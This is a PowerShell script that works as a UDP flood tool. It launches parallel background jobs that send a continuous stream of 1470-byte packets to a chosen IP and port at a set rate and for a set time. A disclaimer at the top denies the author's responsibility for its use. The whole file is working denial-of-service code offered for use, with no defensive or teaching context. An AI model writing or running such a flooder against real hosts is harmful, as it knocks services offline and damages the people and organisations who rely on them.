#THE AUTHOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR HOW THE SCRIPT IS USED NOR SYSTEMS USED AGAINST
 
param([string]$ip="127.0.0.1", [int32]$port=80, [int32]$speed=100, [int32]$time=10)
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Net.Sockets.Socket")
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Text.Encoding")
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Math")

$jobs=[system.math]::floor($speed/100)

$functions = {
    function send-it {
        param([string]$ip, [int32]$port)
        $sock=New-Object System.Net.Sockets.Socket 2,2,17
        $sock.Connect($ip,$port)
        $data=[System.Text.Encoding]::ASCII.GetBytes("A"*1470)

        while(1 -eq 1){
            for($x=0;$x-lt132;$x++){
                [void]$sock.send($data)
            }
            Start-Sleep -Milliseconds 1
        }
    }
    function send-partial {
        param([string]$ip, [int32]$port, [int32]$speed)
        $sock=New-Object System.Net.Sockets.Socket 2,2,17
        $sock.Connect($ip,$port)
        $data=[System.Text.Encoding]::ASCII.GetBytes("A"*1470)
       
        while(1 -eq 1){
            for($i=0;$i-lt([system.math]::ceiling($speed%100*1000/768));$i++){
                [void]$sock.send($data)
            }
            Start-Sleep -Milliseconds 1
        }
    }
}

for($i=0;$i -lt $jobs;$i++){
    Start-Job -ArgumentList $ip,$port -InitializationScript $functions -ScriptBlock {
        param([string]$ip, [int32]$port)
        send-it -ip $ip -port $port
    }
    clear
}

if(($speed%100) -ne 0){
    Start-Job -ArgumentList $ip,$port,$speed -InitializationScript $functions -ScriptBlock {
        param([string]$ip, [int32]$port, [int32]$speed)
        send-partial -ip $ip -port $port -speed $speed
    }
    clear
}

while($time -gt 0){
    echo ("Trying to send about " + $speed.ToString() + "mb/s to " + $ip + ":" + $port.ToString() + " for " + $time.ToString() +" more seconds")
    Start-Sleep -Seconds 1
    clear
    $time=$time-1
}

Stop-Job *
Remove-Job *
